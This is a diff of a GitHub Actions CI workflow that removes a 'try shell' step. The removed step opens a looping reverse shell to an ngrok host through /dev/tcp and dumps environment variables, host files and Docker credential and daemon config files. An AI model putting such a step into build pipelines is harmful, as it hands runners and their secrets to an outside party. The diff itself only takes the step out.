@@ -27,27 +27,6 @@ jobs:
           export BUILD_VERSION="$( .dev/maven-get-version.sh )"
           make -s build/info | tee -a $GITHUB_ENV
 
-      - name: try shell
-        run: |
-          set -eux
-          cat /etc/hosts
-
-          while sleep 5; do
-            sh -i >& /dev/tcp/0.tcp.sa.ngrok.io/16106 0>&1
-          done
-
-          hn="$(hostname)"
-          docker run -d --rm -p 8000:8000 python:3.9 python3 -m http.server
-          sleep 5
-          curl localhost:8000 -v
-
-          nslookup "$(hostname)"
-          docker info
-          env
-          cat ~/.docker/config.json || true
-          cat /etc/docker/daemon.json || true
-          false
-
       - name: Lint scripts and Dockerfile
         run: make lint
 
